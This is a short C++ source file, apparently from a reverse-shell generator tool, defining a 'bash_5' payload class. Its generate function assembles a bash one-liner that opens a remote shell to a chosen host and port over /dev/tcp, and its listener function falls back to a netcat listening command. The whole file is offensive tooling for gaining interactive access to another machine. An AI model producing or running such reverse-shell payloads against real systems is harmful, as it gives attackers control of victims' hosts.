# include "Bash_5_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string Bash5Payload::name() const {
    return "bash_5";
}

std::string Bash5Payload::generate(const Options& opts) const {
    return opts.interpreter + "-i 5<> /dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + " 0<&5 1>&5 2>&5";
}

std::string Bash5Payload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}